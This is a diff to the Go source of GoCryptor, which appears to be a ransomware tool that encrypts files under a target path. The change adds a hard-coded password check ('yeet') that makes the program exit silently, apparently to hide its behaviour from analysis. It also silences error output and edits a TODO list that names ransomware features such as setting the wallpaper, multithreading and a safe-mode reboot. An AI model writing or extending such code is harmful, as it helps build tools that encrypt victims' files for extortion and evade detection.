@@ -2,11 +2,9 @@ package main
 
 import (
 	"flag"
-	"fmt"
 	"math/rand"
 	"os"
 	"path/filepath"
-	"syscall"
 	"time"
 
 	"github.com/rodolfoag/gow32"
@@ -17,7 +15,12 @@ var GoCryptorConfig Configuration
 
 func main() {
 	targetPathPtr := flag.String("path", "", "A target path to encrypt")
+	password := flag.String("pass", "", "Password for cryptor")
 	flag.Parse()
+
+	if *password != "yeet" {
+		return
+	}
 
 	decompressedConfig, err := decompress(CompressedConfig)
 	if err != nil {
@@ -56,7 +59,7 @@ func main() {
 	if GoCryptorConfig.runOnceFlag {
 		mutexHandle, err = gow32.CreateMutex(string(GoCryptorConfig.runOnceString[:]))
 		if err != nil {
-			fmt.Printf("Error: %d - %s\n", int(err.(syscall.Errno)), err.Error())
+			// fmt.Printf("Error: %d - %s\n", int(err.(syscall.Errno)), err.Error())
 			panic(err)
 		}
 	}
@@ -74,11 +77,5 @@ func main() {
 
 // Things to do:
 // - Command line arguments
-//      - wallpaper
 // Pre-Encryption:
-// - Cryptographic Keys Setup
 // - Multithreading
-
-// things to do last
-// - Safemood Reboot
-// - wallpaper
